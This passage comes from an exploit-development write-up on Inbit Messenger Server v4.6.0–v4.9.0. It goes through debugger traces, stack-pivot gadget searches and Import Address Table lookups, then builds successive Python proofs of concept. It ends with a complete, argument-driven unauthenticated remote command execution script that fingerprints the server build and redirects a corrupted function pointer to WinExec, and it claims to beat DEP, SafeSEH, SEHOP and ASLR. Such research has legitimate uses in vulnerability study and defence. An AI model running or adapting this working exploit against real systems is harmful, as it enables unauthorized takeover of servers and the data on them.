0014f970  00000000
0014f974  00120400
0014f978  0000044c
0014f97c  00000009
0014f980  00000000
0014f984  00120442
0014f988  00000363
0014f98c  00000001
0014f990  6a7ab230 COMCTL32!CListView::Release
0014f994  0014f9c0
0014f998  761a3c77 USER32!_InternalCallWinProc+0x2b
0014f99c  00120442
0014f9a0  00000363
0014f9a4  00000001
0014f9a8  00000000
0014f9ac  f248e40a
0014f9b0  0014f8d8
0014f9b4  0014f9d8
0014f9b8  0014fa50
0014f9bc  75035c40 mswsock!_except_handler4
0014f9c0  87595272
0014f9c4  fffffffe
0014f9c8  0014fa60
0014f9cc  0014fa34
0014f9d0  04057c00
0014f9d4  04057c04
0014f9d8  3e3c0000
0014f9dc  41003936
0014f9e0  41414141
0014f9e4  41414141
0014f9e8  41414141
0014f9ec  41414141
0014f9f0  41414141
0014f9f4  41414141
0014f9f8  41414141
0014f9fc  41414141
0014fa00  41414141
0014fa04  41414141
0014fa08  41414141
0014fa0c  41414141
0014fa10  41414141
0014fa14  41414141
0014fa18  41414141
0014fa1c  41414141
0014fa20  41414141
0014fa24  41414141
0014fa28  41414141
0014fa2c  41414141
0014fa30  41414141
0014fa34  41414141
0014fa38  41414141
```

Our payload of `A` values begins at `0x0014f9e0`. Find the difference:

```
0:000> ? 0x0014f9e0-esp
Evaluate expression: 308 = 00000134
```

So we need to find a stack pivot gadget that moves the stack up at least 308 bytes. The pivot can pivot further than that but must be at least 308 bytes. To find these gadgets, we will use [RP++](https://github.com/0vercl0k/rp) as before on each non-ASLR application module:

```
C:\Program Files\Inbit\Inbit Messenger Server\IMS.EXE      
C:\Program Files\Inbit\Inbit Messenger Server\IMLib.dll    
C:\Program Files\Inbit\Inbit Messenger Server\ipworks6.dll 
C:\Program Files\Inbit\Inbit Messenger Server\IMSDLG.dll   
C:\Program Files\Inbit\Inbit Messenger Server\ImsRes.dll   
```

The idea is to search each ROP gadget output with the following RegEx:

```
: add esp, dword \[e...*ret
: add esp, 0x.*ret
```

Then copy the gadget addresses and search for them in WinDbg. For example, the following gadgets from `IMLIB.DLL` are valid stack pivots for us:

```assembly
0x10001a66: add esp, 0x00000210 ; ret
0x10001108: add esp, 0x00000218 ; ret
0x1000119f: add esp, 0x00000218 ; ret
0x10004467: add esp, 0x00000228 ; ret
0x10001f3e: add esp, 0x00000234 ; ret
0x10001f8e: add esp, 0x00000234 ; ret
0x10003659: add esp, 0x00000240 ; ret
0x10003623: add esp, 0x00000240 ; ret
0x1000368f: add esp, 0x00000240 ; ret
0x10006554: add esp, 0x000004C0 ; retn 0x0004
```

Now we get the module locations in WinDbg (without ASLR):

```
0:000> lm
start    end        module name
00400000 006c4000   IMS        (no symbols)           
00bc0000 00d61000   IMSDLG     (deferred)             
024e0000 0256b000   ImsRes     (deferred)             
10000000 10055000   IMLib      (deferred)             
26340000 263d2000   ipworks6   (deferred)
```

And then search for an **indirect** address to these gadgets:

```
s -d 10000000 10055000 0x10001a66
s -d 10000000 10055000 0x10001108
s -d 10000000 10055000 0x1000119f
s -d 10000000 10055000 0x10004467
s -d 10000000 10055000 0x10001f3e
s -d 10000000 10055000 0x10001f8e
s -d 10000000 10055000 0x10003659
s -d 10000000 10055000 0x10003623
s -d 10000000 10055000 0x1000368f
s -d 10000000 10055000 0x10006554
```

However, if we do this for *ALL LOADED MODULES* we get nothing... This makes things complicated...

## Calling WinExec

Another method for weaponizing this indirect function pointer overwrite is to use the Import Address Table of the PE format. The IAT is essentially a large table of indirect function pointers already. Since we have good control over the 2 arguments on the stack passed to the function, we want to find an imported function in some application module we can call to make this vulnerability exploitable. If we search through the IAT entries for the following modules using CFF Explorer, we find something interesting for `IMS.EXE`:

![37](./img/37.png)

It seems that `IMS.EXE` imports `WinExec` from `kernel32.dll`:

- https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec

The function signature for this is as follows:

```c
UINT WinExec(
  [in] LPCSTR lpCmdLine,
  [in] UINT   uCmdShow
);
```

This almost matches our controlled function parameters exactly! The `uCmdShow` argument has the following list of valid values:

- https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow

That part may be tricky because the second argument is the length of the first argument. However, since we control the number of bytes the application receives up until `0xfc64`, we can effectively pad out a command line to ensure it matches or does not match certain constants defined. However, we do not know if `WinExec` will error on an invalid value for `uCmdShow`. Time to make a PoC:

```python
import sys, socket, subprocess

payload = subprocess.check_output([
  '/opt/metasploit-framework/embedded/bin/ruby',
  '/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb',
  '-l',
  f'{100}']).strip()
print(f'[+] generated payload length is {len(payload)} bytes')

pkt  = b"<"        # start of packet
pkt += b"69\x00"   # the number parsed by atol()
pkt += payload     # random data into the overflow buffer
pkt += b">"        # end of XML tag
pkt += (b"B" * 69) # random data at the end of the packet matching the number of bytes in the tag

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], int(sys.argv[2])))
s.send(pkt)
s.close()
```

This first PoC is to find out where the offset to the function pointer is in our first buffer:

```
(118.18e0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=63413863 ebx=00000045 ecx=0014fa34 edx=00000001 esi=01c64f20 edi=76ed23a0
eip=00466e21 esp=0014f8ac ebp=0014fa10 iopl=0         nv up ei pl nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010213
IMS+0x66e21:
00466e21 ff5038          call    dword ptr [eax+38h]  ds:0023:6341389b=????????
```

While we are here, get the IAT entry for `WinExec` using WinDbg as we did before during the DEP bypass:

```powershell
r $t0 = poi(ims + poi(ims + 0x3c) + 0xd8)
r $t1 = poi(ims + poi(ims + 0x3c) + 0xdc)
dps ims+$t0 l? (($t1+4)/4) 
```

And this returns the following entry in the list:

```
005f3360  76f943e0 KERNEL32!WinExec
```

Now get the offset for the `EAX` indirect function pointer from the crash:

```bash
/opt/metasploit-framework/embedded/bin/ruby \
  /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb \
  -q 63413863
# [*] Exact match at offset 85
```

Now modify the PoC and see if we call `WinExec` using the IAT entry at `0x005f3360`

```python
import sys, socket, struct

# NOTE: we need to subtract 0x38 since the instruction is 'CALL [EAX + 0x38]'
WINEXEC = struct.pack("<I", 0x005f3360 - 0x38)

pkt  = b"<"        # start of packet
pkt += b"69\x00"   # the number parsed by atol()
pkt += (b"A" * 85) # random data into the overflow buffer up to function pointer overwrite
pkt += WINEXEC     # indirect function pointer we control
pkt += b">"        # end of XML tag
pkt += (b"B" * 69) # random data at the end of the packet matching the number of bytes in the tag

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], int(sys.argv[2])))
s.send(pkt)
s.close()
```

When we run this PoC, set a breakpoint on `WinExec`:

```
(1e94.724): Break instruction exception - code 80000003 (first chance)
eax=00246000 ebx=00000000 ecx=7792b540 edx=7792b540 esi=7792b540 edi=7792b540
eip=778f2630 esp=01dcff44 ebp=01dcff70 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!DbgBreakPoint:
778f2630 cc              int     3
0:011> bp kernel32!winexec
0:011> g
Breakpoint 0 hit
eax=005f3328 ebx=00000045 ecx=0014fa34 edx=00000001 esi=02844f20 edi=76ed23a0
eip=76f943e0 esp=0014f8a8 ebp=0014fa10 iopl=0         nv up ei pl nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
KERNEL32!WinExec:
76f943e0 8bff            mov     edi,edi
```

We did it! Check the stack:

```
0:000> dps esp L0n5
0014f8a8  00466e24 IMS+0x66e24
0014f8ac  00677440 IMS+0x277440
0014f8b0  00000045
0014f8b4  86e163fc
0014f8b8  02844fbc
0:000> da 00677440 
00677440  "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
00677460  "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
00677480  "BBBBB"
0:000> ? 45
Evaluate expression: 69 = 00000045
```

Swell! We can execute an arbitrary command on the target system using this PoC. If we continue past this call, we hit the stack cookie failure as expected:

```
0:000> r
eax=005f3328 ebx=00000045 ecx=0014fa34 edx=00000001 esi=02844f20 edi=76ed23a0
eip=76f943e0 esp=0014f8a8 ebp=0014fa10 iopl=0         nv up ei pl nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
KERNEL32!WinExec:
76f943e0 8bff            mov     edi,edi
0:000> pt
eax=00000002 ebx=00000045 ecx=00645433 edx=00800000 esi=02844f20 edi=76ed23a0
eip=76f9453e esp=0014f8a8 ebp=0014fa10 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
KERNEL32!WinExec+0x15e:
76f9453e c20800          ret     8
0:000> t
eax=00000002 ebx=00000045 ecx=00645433 edx=00800000 esi=02844f20 edi=76ed23a0
eip=00466e24 esp=0014f8b4 ebp=0014fa10 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
IMS+0x66e24:
00466e24 8b45c4          mov     eax,dword ptr [ebp-3Ch] ss:0023:0014f9d4=02844fbc
0:000> g

STATUS_STACK_BUFFER_OVERRUN encountered
(1e94.7a0): Break instruction exception - code 80000003 (first chance)
eax=00000000 ebx=00000001 ecx=75bc07c4 edx=0014f381 esi=00000000 edi=00000000
eip=75c94447 esp=0014f4e4 ebp=0014f574 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
KERNELBASE!UnhandledExceptionFilter+0x57:
75c94447 cc              int     3
```

This is unavoidable since we need to overwrite the stack cookie in order to gain control of the indirect function pointer to call `WinExec`. 

It **may** be possible to abuse this functionality in a different way since the application calls the `recv()` in a loop until the application has received the amount of bytes we specified in the first `<>` tag. We could send our data in chunks in order to force the application to make the indirect function call multiple times! Instead of calling `WinExec()`, we could have the application call something else that will walk back up the stack into the buffer of `A` values we control. In order to pivot the stack using this method, we need to abuse a difference in calling conventions:

- https://en.wikipedia.org/wiki/X86_calling_conventions#cdecl
- https://en.wikipedia.org/wiki/X86_calling_conventions#stdcall

If we look at the assembly following the indirect function call, it expects the callee from the indirect function call to be `__stdcall`:

```assembly
mov    ecx,DWORD PTR [ebp-0x44]
mov    eax,DWORD PTR [ecx]
push   ebx
push   DWORD PTR [esi+0x4c]
call   DWORD PTR [eax+0x38]
mov    eax,DWORD PTR [ebp-0x3c]
sub    DWORD PTR [eax],ebx
cmp    DWORD PTR [eax],0x0
jg     0xffffffbc
xor    eax,eax
inc    eax
jmp    0x4c 
```

This means the application expects the called function to clean up the stack for the 2 arguments pushed on as arguments with a `RETN 0x8` instruction. If we change the function pointer to point to a function that uses `__stdcall` as well with more than 2 arguments, then the called function will move the stack **up** more than the caller moved the stack down for the 2 arguments. Since we can do this in a loop and call the indirect function over and over, we can slowly pivot the stack up into our controlled buffer of `A` values!

However, the main complication to this method is that each time the indirect function is called, we do not control the return address pushed onto the stack. We would need to find an IAT entry that contains a function vulnerable if we called it with full control of the arguments after pivoting the buffer into our `A` values. We would also need to find a Win32 API function we can call repeatedly with corrupted arguments that itself will not cause an exception and just return an error code. Thankfully the application does not check the return value of this indirect function call! 

Although there **may** be IAT functions available that satisfy the above conditions, using them would only enable us to pivot to a different vulnerability to gain execution. However, by using `WinExec`, we can gain the same arbitrary code execution using different methods to have the target download and execute a payload. 

## Checking Target Version

Since we are using the IAT entry in `IMS.EXE` for the `WinExec` call, each time the application changes its version, this IAT entry address will likely change! We did not have to worry about this before when using `ipworks6.dll`. Now, we need a way to figure out the target's software version remotely to know which IAT offset to `WinExec` to use. Thankfully, we already have a hint from the light network protocol reverse engineering for a login request:

![20](./img/20.png)

If we look closely at the packets, we see the number `4601`. This matches the build number for the application this traffic was captured for:

![9](./img/9.png)

To test this theory, we will install the other 2 different vulnerable versions we found and see what the network traffic is for a login request in WireShark. Here is `v4.8.0`:

![38](./img/38.png)

And now for `v4.9.0`:

![39](./img/39.png)

We notice the same pattern for the first 2 packets containing the build number! Now make a PoC that attempts to interrogate the application and get the build number using a build number of `4601` for the client request:

```python
import sys, socket

pkt  = b"<50><0><IM><ID>7</ID><a>1</a><b>4601</b><c>1</c></IM>\x00"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], int(sys.argv[2])))
s.send(pkt)
print(s.recv(1024))
s.close()
```

And this returns the following for `v4.9.0`:

```python
b'<67><0><IM><ID>8</ID><a>1</a><b>1</b><c>4901</c><d>41</d><e>0</e></IM>\x00'
```

Swell! The server sent the build number as `4901`. We can remotely figure out the version of the software to know which offset to use for the IAT entry to `WinExec`. Use the same method as before to get the IAT entry for `WinExec` for all vulnerable application versions:

- `v4.9.0` : `KERNEL32!WinExec` is at `0x005f7364`
- `v4.8.0`: `KERNEL32!WinExec` is at `0x005f7364`
- `v4.6.0`: `KERNEL32!WinExec` is at `0x005f3360`

It seems like `v4.9.0` and `v4.8.0` have the same IAT entry. Combine what we know about this vulnerability so far into a PoC to call `WinExec` with a test payload:

```python
import sys, socket, struct, string

# the command to execute on target (NULL terminated!)
CMD = b"cmd.exe /c msg * LOLZ" + b"\x00"

# NOTE: command length must be at least 10 characters long or we will not trigger the indirect call
assert(len(CMD) >= 10)

# NOTE: the max packet length seems to be 0xfc64
assert(len(CMD) <= 0xfc64)

# IAT addresses for KERNEL32!WinExec in IMS.EXE by build number
TARGETS = {
  4601 : 0x005f3360,
  4801 : 0x005f7364,
  4901 : 0x005f7364,
}

def getVersion() -> int:
  # send packet with client build number of 4601 for v4.6.0
  pkt = b"<50><0><IM><ID>7</ID><a>1</a><b>4601</b><c>1</c></IM>\x00"
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((sys.argv[1], int(sys.argv[2])))
  s.send(pkt)
  _d = s.recv(1024)
  # find build tag in response
  if b'<c>' not in _d:
    print(f"invalid packet: {_d}")
    sys.exit(-1)
  s.close()
  return int(_d[_d.index(b'<c>') + 3:_d.index(b'</c>')])

# get the IAT offset 
build = getVersion()
if build not in TARGETS.keys():
  print(f"invalid build number: {build}")
  sys.exit(-1)

# NOTE: we need to subtract 0x38 since the instruction is 'CALL [EAX + 0x38]'
WINEXEC = struct.pack("<I", TARGETS[build] - 0x38)
print(f"build number = {build} & WinExec @ 0x{TARGETS[build] - 0x38:08x}")

# sanity check for bad bytes in WinExec address
BAD_BYTES = b"\x3e" # >
for c in WINEXEC:
  if c in BAD_BYTES:
    print(f"found bad byte in WinExec address: {WINEXEC}")
    sys.exit(-1)

# get a string representation of the legnth of the command data after the <> tag parsed by atol()
PKT_LEN = str(len(CMD))

pkt  = b"<"                               # start of XML tag/stack overflow
pkt += PKT_LEN.encode()                   # number parsed by atol() & length of command data following '>' character
pkt += b"\x00"                            # NULL terminator to force atol to ignore what comes next
# NOTE: here we need to adjust the 85 byte offset calculated that assumed a 2 byte string passed to atol()
pkt += (b"A" * (85 - (len(PKT_LEN) - 2))) # random data into the overflow buffer up to function pointer overwrite
pkt += WINEXEC                            # indirect function pointer we control
pkt += b">"                               # end of XML tag/stack overflow
pkt += CMD                                # the command set to the call to WinExec()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], int(sys.argv[2])))
s.send(pkt)
s.close()
```

This PoC uses the `msg.exe` Windows utility to display a pop-up to indicate successful execution:

- https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/msg

And this displays the popup on `v4.9.0`!

![40](./img/40.png)

**NOTE** The application will crash after we execute this PoC because we corrupted the stack cookie. However, as an exploit, this PoC is worth the investment since it does not rely on SEH as we did before. This means it does not have to bother about SEHOP issues on Windows Server versions! **This means the exploit will work out of the box with DEP/SafeSEH/SEHOP/ASLR on any Windows version that vulnerable versions of this application can be installed on**.

## Unauthenticated Remote Command Execution PoC

Here is the final PoC:

```python
import sys, socket, struct, string, argparse, logging

BANNER = """\033[0m\033[1;35m
╔══════════════════════════════════════════════════════════════════════════╗
║\033[0m Inbit Messenger v4.6.0 - v4.9.0 Unauthenticated Remote Command Execution \033[1;35m║
╚══════════════════════════════════════════════════════════════════════════╝\033[0m
 by: \033[1;36m █████╗      ██████╗ ███████╗██╗   ██╗
     \033[1;36m██╔══██╗     ██╔══██╗██╔════╝██║   ██║
     \033[1;36m███████║ ███ ██████╔╝█████╗   ██╗ ██═╝
     \033[1;36m██╔══██║     ██╔══██╗██╔══╝     ██╔╝  
     \033[1;36m██║  ██║     ██║  ██║███████╗   ██║   
     \033[1;36m╚═╝  ╚═╝     ╚═╝  ╚═╝╚══════╝   ╚═╝   
\033[0m"""

# NOTE: IAT addresses for KERNEL32!WinExec in IMS.EXE by build number
TARGETS = {
  4601 : 0x005f3360,
  4801 : 0x005f7364,
  4901 : 0x005f7364,
}

# NOTE: min and max values for length of command
CMD_MIN_LEN = 10
CMD_MAX_LEN = 0xfc64

# NOTE: these bytes cannot be in the calculated address of WinExec to ensure overflow
BAD_BYTES = b"\x3e" # >

def getWinExecAddress(targetIp:str, targetPort:int) -> bytes:
  # NOTE: send packet with client build number of 4601 for v4.6.0
  pkt = b"<50><0><IM><ID>7</ID><a>1</a><b>4601</b><c>1</c></IM>\x00"
  logging.info(f"trying to get version information from {targetIp}:{targetPort} ...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((targetIp, targetPort))
  s.send(pkt)
  _d = s.recv(1024)
  # find build tag in response
  if b'<c>' not in _d:
    logging.error(f"invalid version packet received: {_d}")
    sys.exit(-1)
  s.close()
  try:
    build = int(_d[_d.index(b'<c>') + 3:_d.index(b'</c>')])
  except:
    logging.error(f"failed to parse build number from packet: {_d}")
    sys.exit(-1)
  # get the IAT offset 
  if build not in TARGETS.keys():
    logging.error(f"unexpected build number: {build}")
    sys.exit(-1)
  # NOTE: we need to subtract 0x38 since the vulnerable instruction is 'CALL [EAX + 0x38]'
  winexec = struct.pack("<I", TARGETS[build] - 0x38)
  logging.success(f"target build number is {build}")
  logging.info(f"WinExec @ 0x{TARGETS[build] - 0x38:08x}")
  # sanity check for bad bytes in WinExec address
  for c in winexec:
    if c in BAD_BYTES:
      logging.error(f"found bad byte in WinExec address: 0x{TARGETS[build] - 0x38:08x}")
      sys.exit(-1)
  return winexec

def exploit(targetIp:str, targetPort:int, command:bytes) -> None:
  # NOTE: command must be NULL terminated
  command += b"\x00"
  # check user command length
  if len(command) < CMD_MIN_LEN:
    logging.error(f"command length must be at least {CMD_MIN_LEN} characters")
    sys.exit(-1)
  if len(command) >= CMD_MAX_LEN:
    logging.error(f"command length must be less than {CMD_MAX_LEN} characters")
    sys.exit(-1)
  # get WinExec address
  winexec = getWinExecAddress(targetIp, targetPort)
  # get a string representation of the length of the command data after the <> tag parsed by atol()
  pktLen = str(len(command))
  pkt  = b"<"            # start of XML tag/stack overflow
  pkt += pktLen.encode() # number parsed by atol() & length of command data following '>' character
  pkt += b"\x00"         # NULL terminator to force atol to ignore what comes next
  # NOTE: adjust the 85 byte offset calculated that assumes a 2 byte string passed to atol()
  pkt += (b"A" * (85 - (len(pktLen) - 2))) # padding up to function pointer overwrite
  pkt += winexec                           # indirect function pointer we control
  pkt += b">"                              # end of XML tag/stack overflow
  pkt += command                           # the command set to the call to WinExec()
  logging.info(f"sending payload to {targetIp}:{targetPort} ...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((targetIp, targetPort))
  s.send(pkt)
  s.close()
  logging.success("DONE")

if __name__ == '__main__':
  # parse arguments
  parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter, usage=BANNER)
  parser.add_argument('-t', '--target',  help='target IP',      type=str, required=True)
  parser.add_argument('-c', '--command', help='command to run', type=str, required=True)
  parser.add_argument('-p', '--port',    help='target port',    type=int, required=False, default=10883)
  args = parser.parse_args()
  # define logger
  logging.basicConfig(format='[%(asctime)s][%(levelname)s] %(message)s', datefmt='%d %b %Y %H:%M:%S', level='INFO')
  logging.SUCCESS = logging.CRITICAL + 1
  logging.addLevelName(logging.SUCCESS, '\033[0m\033[1;32mGOOD\033[0m')
  logging.addLevelName(logging.ERROR,   '\033[0m\033[1;31mFAIL\033[0m')
  logging.addLevelName(logging.WARNING, '\033[0m\033[1;33mWARN\033[0m')
  logging.addLevelName(logging.INFO,    '\033[0m\033[1;36mINFO\033[0m')
  logging.success = lambda msg, *args: logging.getLogger(__name__)._log(logging.SUCCESS, msg, args)
  # print banner
  print(BANNER)
  # run exploit
  exploit(args.target, args.port, args.command.encode())
```

And here is the demo on a Windows Server 2019 with **all exploit protections enabled**:

https://raw.githubusercontent.com/a-rey/exploits/main/writeups/Inbit_Messenger/v4.6.0/img/win2019_all.mov

At this point, we can wrap up this already way too long write-up. There may very well be more or better vulnerabilities to be found, but it is time to move on for now :)